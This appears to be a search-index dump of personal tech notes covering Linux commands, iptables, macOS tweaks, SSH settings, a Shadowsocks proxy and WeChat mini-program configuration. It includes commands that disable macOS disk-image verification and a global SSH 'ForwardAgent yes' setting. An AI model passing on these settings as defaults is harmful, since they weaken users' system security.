why records are, by default, single lines. To use a different character for the record separator, simply assign that character to the predefined variable RS. For example:\n$ awk \u0026#39;BEGIN {RS=\u0026#39;u\u0026#39;}; {print $0}\u0026#39; data Another way to change to record separator is on the command line, using the variable-assignment feature:\n$ awk \u0026#39;{print $0}\u0026#39; RS=\u0026#34;u\u0026#34; data "},{"id":348,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/commandset/command/","title":"Command","section":"CommandSet","content":"Question: How to check if a program exists from a Bash script?\nAnswer: three possible method:\n  POSIX compatible:\n$ command -v \u0026lt;the_command\u0026gt;   For bash specific environments:\n$ hash \u0026lt;the_command\u0026gt; # For regular commands. Or... $ type \u0026lt;the_command\u0026gt; # To check built-ins and keywords   Many operating systems have a which that doesn\u0026rsquo;t even set an exit status, meaning the if which foo won\u0026rsquo;t even work there and will always report that foo exists, even if it doesn\u0026rsquo;t (note that some POSIX shells appear to do this for hash too).\nSo, don\u0026rsquo;t use which. Instead use one of these:\n$ command -v foo \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || { echo \u0026gt;\u0026amp;2 \u0026#34;I require foo but it\u0026#39;s not installed. Aborting.\u0026#34;; exit 1; } $ type foo \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || { echo \u0026gt;\u0026amp;2 \u0026#34;I require foo but it\u0026#39;s not installed. Aborting.\u0026#34;; exit 1; } $ hash foo 2\u0026gt;/dev/null || { echo \u0026gt;\u0026amp;2 \u0026#34;I require foo but it\u0026#39;s not installed. Aborting.\u0026#34;; exit 1; } "},{"id":349,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/commandset/crontab/","title":"Crontab","section":"CommandSet","content":" 学习网址：\n https://www.marksanborn.net/linux/learning-cron-by-example/ http://www.unixgeeks.org/security/newbie/unix/cron-1.html   CRON #  If you are using a Linux system and want to schedule a task to run in the future you will probably need to know cron. Cron is much like Window’s Scheduled Tasks. The only difference is that cron is conifgured by a simple text file.\nNow obviously cron is very dependent and sensitive to the time. If you want accurate results from cron you are going to want to setup your computer to sync its clock via NTP.\n$ sudo ntpdate pool.ntp.org Editing Cron #  There are more than one way to edit the cron config files; however many of them require you to restart the service.\nHere is a method to add a task to cron without having to restart the deamon:\n$ crontab -e Here is the basic structure for cron:\nm h dom mon dow command\rwhere\n m - minutes h - hours (24 hours) dom - day of month mon - month dow - day of the week command - the command you want to run. This can contain spaces or point to a bash script.  Examples #  *’s represent wildcards or any:\n10 * * * * echo “This command is run at 10 min past every hour”\r22 7 * * * echo “This command is run daily at 7:22 am”\r00 4 * * 0 echo “This command is run at 4 am every Sunday”\rPostScript: In dow, 0 and 7 are both represent Sunday.\nUsing the - allows us to specify ranges of days (Execute at 5 pm only in weekdays):\n* 17 * * 1-5 /path/to/your/code\rUsing the , allows us to specify intervals without having to have multiple entries in cron: (This would execute the ask on the 1st, the 10th, the 20th and on the 30th of each month, at 17:59 PM.)\n59 17 1,10,20,30 * * /home/username/backupsite\rUsing the / allows us to divide the day into chunks: (Here, the tasks is executed every 4 hours (24⁄6 =4).)\n59 */6 * * * /home/username/backupsite\rStart #  Cron is a daemon, which means that it only needs to be started once, and will lay dormant until it is required.\nThe cron daemon, or crond, stays dormant until a time specified in one of the config files, or crontabs.\n"},{"id":350,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/commandset/du/","title":"Du","section":"CommandSet","content":"du #  用于计算文件或文件夹大小的命令，若要计算一个文件夹的大小：\n$ du -h \u0026lt;your-folder\u0026gt; 若要只显示一个文件夹大小的总和：\n$ du -hcs \u0026lt;your-folder\u0026gt; "},{"id":351,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/commandset/fold/","title":"Fold","section":"CommandSet","content":"Fold #  fold:\n  manual:\n Usage: fold [OPTION]\u0026hellip; [FILE]\u0026hellip; Wrap input lines in each FILE, writing to standard output.\n   example:\n$ echo \u0026#34;Hello\u0026#34; \u0026gt; t1 $ echo \u0026#34;World\u0026#34; \u0026gt; t2 $ fold t1 t2 Hello World   "},{"id":352,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/commandset/grep/","title":"Grep","section":"CommandSet","content":"grep #  Example #   https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux\n Find all files containing specific text:\n$ grep -rnw \u0026#39;/path/to/somewhere/\u0026#39; -e \u0026#39;pattern\u0026#39;  -r or -R is recursive, -n is line number, and -w stands for match the whole word. -l (lower-case L) can be added to just give the file name of matching files.  Along with these, --exclude, --include, --exclude-dir flags could be used for efficient searching:\n  This will only search through those files which have .c or .h extensions:\n$ grep --include=\\*.{c,h} -rnw \u0026#39;/path/to/somewhere/\u0026#39; -e \u0026#34;pattern\u0026#34;   This will exclude searching all the files ending with .o extension:\n$ grep --exclude=*.o -rnw \u0026#39;/path/to/somewhere/\u0026#39; -e \u0026#34;pattern\u0026#34;   For directories it\u0026rsquo;s possible to exclude a particular directory(ies) through --exclude-dir parameter. For example, this will exclude the dirs dir1/, dir2/ and all of them matching *.dst/:\n$ grep --exclude-dir={dir1,dir2,*.dst} -rnw \u0026#39;/path/to/somewhere/\u0026#39; -e \u0026#34;pattern\u0026#34;   "},{"id":353,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/commandset/netstat/","title":"Netstat","section":"CommandSet","content":" 学习地址：\n https://linuxtechlab.com/learn-use-netstat-with-examples/   learn netstat with example.\nnetstat #  Netstat is a command line utility that tells us about all the tcp/udp/unix socket connections on our system. It provides list of all connections that are currently established or are in waiting state. This tool is extremely useful in identifying the port numbers on which an application is working and we can also make sure if an application is working or not on the port it is supposed to work.\nExample #    Checking all connections:\n$ netstat -a   Check all tcp connections:\n$ netstat -at Check all udp connections:\n$ netstat -au Checking all unix connections:\n$ nestat -ax   List process id and name (it can be combination with any other netstat option):\n$ netast -ap   List all port number without its name (it will perform any reverse lookup \u0026amp; produce output with only numbers.), used to speed up:\n$ netstat -an port such as 22 will be resolve as ssh if n option is not specify.\n  Print only listen port:\n$ netstat -l   Print networks stats:\n$ netstat -s   Print Interfaces stats:\n$ netstat -i   Display multicast group information:\n$ netstat -g   Display network routing information:\n$ netstat -r   To get continuous information:\n$ netstat -c   "},{"id":354,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/commandset/patch/","title":"Patch","section":"CommandSet","content":"patch #  Linux 中的 patch 命令与 diff 命令是一对命令。\n如果我们将 diff 命令的输出导入到一个文件中，这个文件就可以称作一个 “补丁”，利用 patch 命令就可以将变化 apply 到每一个具体的文件中。\n"},{"id":355,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/commandset/tmux/","title":"Tmux","section":"CommandSet","content":"  https://www.hamvocke.com/blog/a-quick-and-easy-guide-to-tmux/   "},{"id":356,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/commandset/wc/","title":"Wc","section":"CommandSet","content":" 学习地址：\n https://www.tecmint.com/wc-command-examples/   wc #  The wc(word count) command in Unix/Linux operating systems is used to find out number of newline count, word count, byte and characters count in a files specified by the file arguments.\nThe syntax of wc command as shown below:\n$ wc [options] filenames The following are the options and usage provided by the command:\nwc -l : Prints the number of lines in a file. wc -w : prints the number of words in a file. wc -c : Displays the count of bytes in a file. wc -m : prints the count of characters from a file. wc -L : prints only the length of the longest line in a file. "},{"id":357,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/shell%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/","title":"Shell自学笔记","section":"Linux","content":"自学笔记 (pdf) #  \r"},{"id":358,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/","title":"基本操作","section":"Linux","content":"自学笔记 (pdf) #  \r"},{"id":359,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/linux/%E9%98%B2%E7%81%AB%E5%A2%99/","title":"防火墙","section":"Linux","content":" 学习网址：\n https://www.jianshu.com/p/c2aee2ff7bd8 https://www.jianshu.com/p/62028875d53e  一个关于转发的教程：\n https://www.91yun.co/archives/3042   iptables 防火墙 #  用于实现Linux下访问控制的功能的，它分为硬件的或者软件的防火墙两种。无论是在哪个网络中，防火墙工作的地方一定是在网络的边缘。\n工作机制 #  iptables 是工作在用户空间中，定义规则的工具，本身并不算是防火墙。\n它定义的规则，可以让在内核空间当中的 netfilter 来读取，并且实现让防火墙工作。所以这些规则放入内核的地方必须要是特定的位置，必须是 tcp/ip 的协议栈经过的地方，这个 tcp/ip 协议栈必须经过且可以实现读取规则的地方就叫做 netfilter（网络过滤器）。这些特定的位置包括：\n 内核空间中：从一个网络接口进来，到另一个网络接口去的位置 数据包从内核流入用户空间的位置 数据包从用户空间流出的位置 进入/离开本机的外网接口 进入/离开本机的内网接口  由上我们知道了 iptables 选择了 5 个位置来作为控制的地方。\n但是你有没有发现，其实前三个位置已经基本上能将路径彻底封锁了，但是为什么已经在进出的口设置了关卡之后还要在内部卡呢？ 由于数据包尚未进行路由决策，还不知道数据要走向哪里，所以在进出口是没办法实现数据过滤的。所以要在内核空间里设置转发的关卡，进入用户空间的关卡，从用户空间出去的关卡。\n那么，既然他们没什么用，那我们为什么还要放置他们呢？因为我们在做 NAT 和 DNAT 的时候，目标地址转换必须在路由之前转换。所以我们必须在外网而后内网的接口处进行设置关卡。\n这五个位置放置了五个钩子函数（hook functions）,也叫五个规则链:\n  PREROUTING （路由前）\n  INPUT （数据包流入口）\n  FORWARD （转发管卡）\n  OUTPUT（数据包流出口）\n  POSTROUTING（路由后）\n  这是 netfilter 规定的五个规则链，任何一个数据包，只要经过本机，必将经过这五个链中的其中一个链。\n策略 #  防火墙策略一般分为两种：\n 一种叫“通”策略，认门是关着的，必须要定义谁能进。 一种叫“堵”策略，大门是洞开的，但是你必须有身份认证，否则不能进。  当我们定义策略时，要分别定义多条功能：定义数据包 → 允许或不允许；filter → 过滤的功能；地址转化 → NAT 选项。为了让这些功能交替工作，我们制定出 “表” 的概念，来定义、区分各种不同的工作功能和处理方式。\n我们现在用的比较多个功能有3个：\n  filter 定义允许或者不允许的 → 一般只能做在3个链上：INPUT ，FORWARD ，OUTPUT。\n  nat 定义地址转换的 → 一般也只能做在3个链上：PREROUTING ，OUTPUT ，POSTROUTING。\n  mangle 功能：修改报文原数据 → 5 个链都可以做。\n  PostScript：iptables/netfilter 这款软件是工作在用户空间的，它的规则立即生效，不是一种服务。而我们 iptables 现在被做成了一个服务，可以进行启动，停止的。启动，则将规则直接生效，停止，则将规则撤销。\n注意：规则的次序非常关键，谁的规则越严格，应该放的越靠前，而检查规则的时候，是按照从上往下的方式进行检查的。\n规则的写法 #  iptables 定义规则的方式：\niptables -t \u0026lt;table\u0026gt; \u0026lt;COMMAND\u0026gt; [chain] \u0026lt;CRETERIA\u0026gt; -j \u0026lt;ACTION\u0026gt;  table：filter, nat, mangle COMMAND: 定义如何对规则进行管理 chain: 定义接下来的规则是在哪个链上，当定义策略时，是可以省略的。 CRETERIA: 指定匹配的标准。 ANCTION: 指定如何进行处理或称处理的方式。  可以使用以下的命令查看定义规则的详细信息：\n$ iptables -L -n -v "},{"id":360,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/macos/1.%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/","title":"1.系统配置","section":"MacOS","content":"系统配置 #  系统配置优化 #    大小写、Ctrl 键交换（我最后还是换回来了）：\n添加脚本文件 ~/.macbootstrap/onlogin.sh：\nhidutil property --set \u0026#39;{\u0026#34;UserKeyMapping\u0026#34;:[{\u0026#34;HIDKeyboardModifierMappingSrc\u0026#34;:0x700000039,\u0026#34;HIDKeyboardModifierMappingDst\u0026#34;:0x7000000E0},{\u0026#34;HIDKeyboardModifierMappingSrc\u0026#34;:0x7000000E0,\u0026#34;HIDKeyboardModifierMappingDst\u0026#34;:0x700000039}]}\u0026#39; 添加开启启动文件 ~/Library/LaunchAgents/com.bestsifter.onlogin.pliste：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;LaunchOnlyOnce\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;Label\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;com.bestswifter.onlogin\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;ProgramArguments\u0026lt;/key\u0026gt; \u0026lt;array\u0026gt; \u0026lt;string\u0026gt;zsh\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;-c\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;\u0026#34;$HOME/.macbootstrap/onlogin.sh\u0026#34;\u0026lt;/string\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;key\u0026gt;KeepAlive\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; 然后在命令行中执行下面的命令：\nsudo launchctl load ~/Library/LaunchAgents/com.bestswifter.onlogin.plist   触摸板优化。只需要轻触触摸板而不需要点击（开启之后好像没有立即生效我也不知道为什么）：\ndefaults write com.apple.AppleMultitouchTrackpad Clicking -int 1 defaults -currentHost write NSGlobalDomain com.apple.mouse.tapBehavior -int 1 defaults write NSGlobalDomain com.apple.mouse.tapBehavior -int 1 三指拖拽（好像命令不怎么管用，不管用的话需要在辅助功能里面手动设置）：\ndefaults write com.apple.driver.AppleBluetoothMultitouch.trackpad TrackpadThreeFingerDrag -bool true defaults write com.apple.AppleMultitouchTrackpad TrackpadThreeFingerDrag -bool true   用好 F1-F12（我的电脑上面好像没有这一排按键？）\n  关闭镜像验证（我还是不建议关闭，安全性还是要有的，做开发的就是不重视安全）：\ndefaults write com.apple.frameworks.diskimages skip-verify -bool true defaults write com.apple.frameworks.diskimages skip-verify-locked -bool true defaults write com.apple.frameworks.diskimages skip-verify-remote -bool true   完全键盘控制（可以使用 tab 键在各个选项中进行切换，空格键选择当前选项）：\ndefaults write NSGlobalDomain AppleKeyboardUIMode -int 3   系统快捷键 #    关于 CTRL：光标移动：常见的几个行级别操作有：\n Ctrl + A：移动到行首； Ctrl + E：移动到行尾； Ctrl + K：删除到行尾； Ctrl + N：移动到下一行（next line）； Ctrl + P：移动到上一行（previous line）。  几个比较常见的字母级别操作有：\n Ctrl + F：向右（Forward）移动一个字母； Ctrl + B：向左（Backward）移动一个字母； Ctrl + D：向右删除一个字母，等价于 → + Delete这个快捷键也很常用； Ctrl + H：向左删除一个字母，等价于 Delete；    关于 OPTION：如果觉得按字母操作太过于细粒度，按行操作又太粗粒度：\n Option + ←：光标向左移动一个单词； Option + →：光标向右移动一个单词； Option + Delete：删除一个单词；    关于 SHIFT：在某个位置点击光标并按住 shift 键不松开，再去另一个位置点击一次，就可以选中两次点击位置之间的文本内容。\n  拓展预览程序 #  对于一些文本文件，按下空格键就可以调用系统的预览程序进行预览，快速浏览文件内容。\n可以输入下面的命令来拓展安装，以便支持更多的文件格式：\n$ brew cask install qlcolorcode qlstephen qlmarkdown quicklook-json qlimagesize webpquicklook qlvideo provisionql quicklookapk  qlolorode：一个代码高亮的插件； qlstepen：可以预览没有后缀的文本文件； qlmarkdown：可以预览 markdown 文件的渲染效果； quicklook-json：提供了对 json 文件的格式化和高亮支持； betterzip：用于预览 zip 文件的内容（需要付费）； qlimagesize：可以用来展示图片的像素和大小； webpquicklook：可以查看 webp 格式的照片； qlvideo：预览各种视频文件； provisionql：可以预览 .app 或 .ipa 后缀的文件； quicklookapk：预览 apk 文件信息；  "},{"id":361,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/macos/2.mac%E5%B7%A5%E4%BD%9C%E6%B5%81/","title":"2. Mac工作流","section":"MacOS","content":"Mac 工作流 #  邮件 #  Mac OS 自带的邮箱系统可以通过模式匹配对邮件进行一些操作。\nitem2 #  一个终端软件（这个我没装，花里胡哨的，跟 hyper、cmder 这些应该差不大）；\nSSH 配置 #  跟 Linux 下的差不多。\n这里写的一些 ssh 全局配置还是比较有用的：\nHost * ForwardAgent yes ServerAliveInterval 10 ServerAliveCountMax 10000 TCPKeepAlive no ControlMaster auto ControlPath ~/.ssh/%h-%p-%r ControlPersist 4h Compression yes 其中：\n ForwardAgent 置为 YES 表示，层级 ssh 链接将使用直接链接； ServerAliveInterval 与 ServerAliveCountAlive 的设置是为了防止服务器主动切断连接，保持连接而向服务器发送心跳包，二者设置分别为心跳包的间隔时间与最大的心跳包发送次数。 ControlMaster 表示每次连接都会建立一个 socket 文件；ControlPath 表示这个 socket 的位置；ControlPersist 表示这个文件会存在四个小时。进行这个设置可以加快下次的连接。  科学上网 #  根据不同的需求，Mac OS 中科学上网，主要用到下面的几个工具：\n  Proxifier： 全局控制工具，负责应用层面的请求转发；\n  Charles：一种代理，负责处理那些需要被抓包的请求；\n  sslocal： ss 代理的客户端，负责处理那些需要走 Shadowsocks 协议的请求；\n  SwitchyOmega：Chrome 拓展工具，负责对 Chrome 中的网页进行智能代理选择。\n  那么如何进行科学上网呢？\n  首先我们需要租一个国外的服务器，然后在上面运行 shadowsocks 服务；\n  如何在本地运行 shadowsocks 呢？\n$ nohup sslocal -q -c shadowsocks.json \u0026amp;    "},{"id":362,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/1.directorystructrue/","title":"1. Directory Structrue","section":"MiniProgram","content":"目录结构 #  文件结构 #  小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。\n一个小程序主体部分由三个文件组成，必须放在项目的根目录，如下：\n   文件 必需 作用     app.js 是 小程序逻辑   app.json 是 小程序公共配置   app.wxss 否 小程序公共样式表    一个小程序页面由四个文件组成，分别是：\n   文件类型 必需 作用     js 是 页面逻辑   wxml 是 页面结构   json 否 页面配置   wxss 否 页面样式表    注意：为了方便开发者减少配置项，描述页面的四个文件必须具有相同的路径与文件名。\n允许上传的文件 #  在项目目录中，以下文件会经过编译，因此上传之后无法直接访问到：.js、app.json、.wxml、*.wxss（其中 wxml 和 wxss 文件仅针对在 app.json 中配置了的页面）。除此之外，只有后缀名在白名单内的文件可以被上传。具体白名单列表如下：\nwxs、png、jpg、jpeg、jpeg、svg、json、cer、mp3、aac、m4a、mp4、wav、ogg、silk\r"},{"id":363,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/2.settings/","title":"2. Settings","section":"MiniProgram","content":"配置 #  全局配置 #  小程序根目录下的 app.json 文件用来对微信小程序进行全局配置，决定页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。\n以下是一个包含了部分常用配置选项的 app.json ：\n{ \u0026#34;pages\u0026#34;: [\u0026#34;pages/index/index\u0026#34;, \u0026#34;pages/logs/index\u0026#34;], \u0026#34;window\u0026#34;: { \u0026#34;navigationBarTitleText\u0026#34;: \u0026#34;Demo\u0026#34; }, \u0026#34;tabBar\u0026#34;: { \u0026#34;list\u0026#34;: [ { \u0026#34;pagePath\u0026#34;: \u0026#34;pages/index/index\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;首页\u0026#34; }, { \u0026#34;pagePath\u0026#34;: \u0026#34;pages/logs/logs\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;日志\u0026#34; } ] }, \u0026#34;networkTimeout\u0026#34;: { \u0026#34;request\u0026#34;: 10000, \u0026#34;downloadFile\u0026#34;: 10000 }, \u0026#34;debug\u0026#34;: true, \u0026#34;navigateToMiniProgramAppIdList\u0026#34;: [\u0026#34;wxe5f52902cf4de896\u0026#34;] } app.json 配置项列表：\n   属性 类型 必填 描述 最低版本     pages String Array 是 页面路径列表    window Object 否 全局的默认窗口表现    tabBar Object 否 底部 tab 栏的表现    networkTimeout Object 否 网络超时时间    debug Boolean 否 是否开启 debug 模式，默认关闭    functionalPages Boolean 否 是否启用插件功能页，默认关闭 2.1.0   subpackages Object Array 否 分包结构配置 1.7.3   workers String 否 Worker 代码放置的目录 1.9.90   requiredBackgroundModes String Array 否 需要在后台使用的能力，如「音乐播放」    plugins Object 否 使用到的插件 1.9.6   preloadRule Object 否 分包预下载规则 2.3.0   resizable Boolean 否 iPad 小程序是否支持屏幕旋转，默认关闭 2.3.0   navigateToMiniProgramAppIdList String Array 否 需要跳转的小程序列表，详见 wx.navigateToMiniProgram 2.4.0   usingComponents Object 否 全局自定义组件配置 开发者工具 1.02.1810190   permission Object 否 小程序接口权限相关设置 微信客户端 7.0.0    Pages #  用于指定小程序由哪些页面组成，每一项都对应一个页面的 路径+文件名 信息。文件名不需要写文件后缀，框架会自动去寻找对于位置的 .json, .js, .wxml, .wxss 四个文件进行处理。\nWindows #  用于设置小程序的状态栏、导航条、标题、窗口背景色。\nwindows 属性列表：\n   属性 类型 默认值 描述 最低版本     navigationBarBackgroundColor HexColor #000000 导航栏背景颜色，如 #000000    navigationBarTextStyle String white 导航栏标题颜色，仅支持 black / white    navigationBarTitleText String  导航栏标题文字内容    navigationStyle String default 导航栏样式，仅支持以下值： default 默认样式 custom 自定义导航栏，只保留右上角胶囊按钮。参见注2。 微信客户端 6.6.0   backgroundColor HexColor #ffffff 窗口的背景色    backgroundTextStyle String dark 下拉 loading 的样式，仅支持 dark / light    backgroundColorTop String #ffffff 顶部窗口的背景色，仅 iOS 支持 微信客户端 6.5.16   backgroundColorBottom String #ffffff 底部窗口的背景色，仅 iOS 支持 微信客户端 6.5.16   enablePullDownRefresh Boolean false 是否开启当前页面的下拉刷新。 详见 Page.onPullDownRefresh    onReachBottomDistance Number 50 页面上拉触底事件触发时距页面底部距离，单位为px。 详见 Page.onReachBottom    pageOrientation String portrait 屏幕旋转设置，支持 auto/ portrait / landscape 详见 响应显示区域变化 2.4.0 (auto) / 2.5.0(landscape)    tabBar #  如果小程序是一个多 tab 应用（客户端窗口的底部或顶部有 tab 栏可以切换页面），可以通过 tabBar 配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。\ntabBar 详细配置列表：\n   属性 类型 必填 默认值 描述 最低版本     color HexColor 是  tab 上的文字默认颜色，仅支持十六进制颜色    selectedColor HexColor 是  tab 上的文字选中时的颜色，仅支持十六进制颜色    backgroundColor HexColor 是  tab 的背景色，仅支持十六进制颜色    borderStyle String 否 black tabbar上边框的颜色， 仅支持 black / white    list Array 是  tab 的列表，详见 list 属性说明，最少2个、最多5个 tab    position String 否 bottom tabBar 的位置，仅支持 bottom / top    custom Boolean 否 false 自定义 tabBar，见详情 2.5.0    其中 list 的详细配置信息如下：\n   属性 类型 必填 说明     pagePath String 是 页面路径，必须在 pages 中先定义   text String 是 tab 上按钮文字   iconPath String 否 图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px，不支持网络图片。 当 postion 为 top 时，不显示 icon。   selectedIconPath String 否 选中时的图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px，不支持网络图片。 当 postion 为 top 时，不显示 icon。    networkTimeout #  各类网络请求的超时时间，单位均为毫秒。\n   属性 类型 必填 默认值 说明     request Number 否 60000 wx.request 的超时时间，单位：毫秒。   connectSocket Number 否 60000 wx.connectSocket 的超时时间，单位：毫秒。   uploadFile Number 否 60000 wx.uploadFile 的超时时间，单位：毫秒。   downloadFile Number 否 60000 wx.downloadFile 的超时时间，单位：毫秒。    debug #  可以在开发者工具中开启 debug 模式，在开发者工具的控制台面板，调试信息以 info 的形式给出，其信息有Page的注册，页面路由，数据更新，事件触发等。可以帮助开发者快速定位一些常见的问题。\nrequiredBackgroundModes #   微信客户端 6.7.2 及以上版本支持\n 申明需要后台运行的能力，类型为数组。目前支持以下项目：\n audio: 后台音乐播放  如：\n{ \u0026#34;pages\u0026#34;: [\u0026#34;pages/index/index\u0026#34;], \u0026#34;requiredBackgroundModes\u0026#34;: [\u0026#34;audio\u0026#34;] } 注：在此处申明了后台运行的接口，开发版和体验版上可以直接生效，正式版还需通过审核。\nusingComponents #   开发者工具 1.02.1810190 及以上版本支持\n 在此处声明的自定义组件视为全局自定义组件，在小程序内的页面或自定义组件中可以直接使用而无需再声明。\npermission #   微信客户端 7.0.0 及以上版本支持\n 小程序接口权限相关设置。字段类型为 Object，结构为：\n   属性 类型 必填 默认值 描述     scope.userLocation PermissionObject 否  位置相关权限声明    PermissionObject 结构\n   属性 类型 必填 默认值 说明     desc string 是  小程序获取权限时展示的接口用途说明。最长30个字符    页面配置 #  每一个小程序页面也可以使用.json文件来对本页面的窗口表现进行配置。\n页面的配置只能设置 app.json 中部分 window 配置项的内容，页面中配置项会覆盖 app.json 的 window 中相同的配置项。\n以下是一个页面配置的示例：\n{ \u0026#34;navigationBarBackgroundColor\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;navigationBarTextStyle\u0026#34;: \u0026#34;black\u0026#34;, \u0026#34;navigationBarTitleText\u0026#34;: \u0026#34;微信接口功能演示\u0026#34;, \u0026#34;backgroundColor\u0026#34;: \u0026#34;#eeeeee\u0026#34;, \u0026#34;backgroundTextStyle\u0026#34;: \u0026#34;light\u0026#34; }    属性 类型 默认值 描述 最低版本     navigationBarBackgroundColor HexColor #000000 导航栏背景颜色，如 #000000    navigationBarTextStyle String white 导航栏标题颜色，仅支持 black / white    navigationBarTitleText String  导航栏标题文字内容    navigationStyle String default 导航栏样式，仅支持以下值： default 默认样式 custom 自定义导航栏，只保留右上角胶囊按钮 微信客户端 7.0.0   backgroundColor HexColor #ffffff 窗口的背景色    backgroundTextStyle String dark 下拉 loading 的样式，仅支持 dark / light    backgroundColorTop String #ffffff 顶部窗口的背景色，仅 iOS 支持 微信客户端 6.5.16   backgroundColorBottom String #ffffff 底部窗口的背景色，仅 iOS 支持 微信客户端 6.5.16   enablePullDownRefresh Boolean false 是否全局开启下拉刷新。 详见 Page.onPullDownRefresh    onReachBottomDistance Number 50 页面上拉触底事件触发时距页面底部距离，单位为px。 详见 Page.onReachBottom    pageOrientation String portrait 屏幕旋转设置，支持 auto/ portrait / landscape 详见 响应显示区域变化 2.4.0 (auto) / 2.5.0(landscape)   disableScroll Boolean false 设置为 true 则页面整体不能上下滚动。 只在页面配置中有效，无法在 app.json 中设置    disableSwipeBack Boolean false 禁止页面右滑手势返回 微信客户端 7.0.0   usingComponents Object 否 页面自定义组件配置 1.6.3     页面的.json只能设置 window 相关的配置项，以决定本页面的窗口表现，所以无需写 window 这个属性。\n "},{"id":364,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/3.logiclayer/1.registerprocess/","title":"1. Register Process","section":"3.LogicLayer","content":"注册程序 App #  App(Object) #  App() 函数用来注册一个小程序。接受一个 Object 参数，其指定小程序的生命周期回调等。\nApp() 必须在 app.js 中调用，必须调用且只能调用一次。不然会出现无法预期的后果。\nObject 参数说明：\n   属性 类型 描述 触发时机     onLaunch Function 生命周期回调—监听小程序初始化 小程序初始化完成时（全局只触发一次）   onShow Function 生命周期回调—监听小程序显示 小程序启动，或从后台进入前台显示时   onHide Function 生命周期回调—监听小程序隐藏 小程序从前台进入后台时   onError Function 错误监听函数 小程序发生脚本错误，或者 api 调用失败时触发，会带上错误信息   onPageNotFound Function 页面不存在监听函数 小程序要打开的页面不存在时触发，会带上页面信息回调该函数   其他 Any 开发者可以添加任意的函数或数据到 Object 参数中，用 this 可以访问     前台、后台定义： 当用户点击左上角关闭，或者按了设备 Home 键离开微信，小程序并没有直接销毁，而是进入了后台；当再次进入微信或再次打开小程序，又会从后台进入前台。需要注意的是：只有当小程序进入后台一定时间，或者系统资源占用过高，才会被真正的销毁。\n onLaunch(Object)：参数也可以使用 wx.getLaunchOptionsSync 获取。 onShow(Object)：也可以使用 wx.onAppShow 绑定监听。 onHide()：也可以使用 wx.onAppHide 绑定监听。  getApp() #  全局的 getApp() 函数可以用来获取到小程序 App 实例。\n示例代码：\n// other.js const appInstance = getApp() console.log(appInstance.globalData) // I am global data 注意：\n 不要在定义于 App() 内的函数中调用 getApp() ，使用 this 就可以拿到 app 实例。 通过 getApp() 获取实例之后，不要私自调用生命周期函数。  "},{"id":365,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/3.logiclayer/2.scenevalues/","title":"2. Scene Values","section":"3.LogicLayer","content":"场景值 #   基础库 1.1.0 开始支持，低版本需做兼容处理。\n 当前支持的场景值有：\n   场景值ID 说明     1001 发现栏小程序主入口，「最近使用」列表（基础库2.2.4版本起包含「我的小程序」列表）   1005 顶部搜索框的搜索结果页   1006 发现栏小程序主入口搜索框的搜索结果页   1007 单人聊天会话中的小程序消息卡片   1008 群聊会话中的小程序消息卡片   1011 扫描二维码   1012 长按图片识别二维码   1013 手机相册选取二维码   1014 小程序模板消息   1017 前往体验版的入口页   1019 微信钱包   1020 公众号 profile 页相关小程序列表   1022 聊天顶部置顶小程序入口   1023 安卓系统桌面图标   1024 小程序 profile 页   1025 扫描一维码   1026 附近小程序列表   1027 顶部搜索框搜索结果页「使用过的小程序」列表   1028 我的卡包   1029 卡券详情页   1030 自动化测试下打开小程序   1031 长按图片识别一维码   1032 